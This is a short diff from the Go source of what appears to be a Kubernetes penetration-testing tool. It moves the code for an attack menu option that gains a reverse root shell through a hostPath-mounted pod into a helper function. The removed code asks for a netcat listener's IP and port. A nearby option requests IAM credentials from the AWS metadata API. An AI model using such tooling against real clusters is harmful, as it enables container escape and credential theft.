@@ -573,32 +573,7 @@ func Main() {
 
 		// [20] Gain a reverse rootshell by launching a hostPath / pod
 		case "20", "attack-pod-hostpath-mount", "attack-hostpath-mount", "attack-pod-mount", "attack-hostmount-pod", "attack-mount-pod":
-			allPods := getPodList(connectionString)
-
-			// Before presenting all IP addresses, give the user the IP address for eth0 if available.
-			eth0IP, err := GetMyIPAddress("eth0")
-			if err != nil {
-				fmt.Println("IP address for eth0 is ", eth0IP)
-			}
-
-			println("Your IP addresses: ")
-			GetMyIPAddressesNative()
-
-			println("What IP and Port will your netcat listener be listening on?")
-			var ip, port string
-			println("IP:")
-			_, err = fmt.Scanln(&ip)
-			if err != nil {
-				println("[-] Error reading IP address.")
-				break
-			}
-			println("Port:")
-			_, err = fmt.Scanln(&port)
-			if err != nil {
-				println("[-] Error reading port.")
-				break
-			}
-			MountRootFS(allPods, connectionString, ip, port)
+			attackHostPathMount(connectionString, interactive)
 
 		// [12] Request IAM credentials from AWS Metadata API [AWS only]
 		case "12", "get-aws-token":
